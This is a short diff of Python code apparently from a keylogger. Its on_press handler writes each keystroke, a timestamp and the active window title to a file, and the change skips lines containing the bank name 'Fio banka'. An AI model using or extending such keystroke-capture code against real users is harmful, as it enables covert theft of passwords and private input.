@@ -16,7 +16,8 @@ def on_press(key):
         x = datetime.datetime.now()
         try:
             str = x.strftime("%Y-%m-%d %H:%M:%S") + ":\t " + GetWindowText(GetForegroundWindow()) + ":\t " + k + "\n"
-            f.write(str.encode('ascii', 'ignore').decode('ascii'))
+            if not str.__contains__('Fio banka'):
+                f.write(str.encode('ascii', 'ignore').decode('ascii'))
         except:
            pass
         f.close()
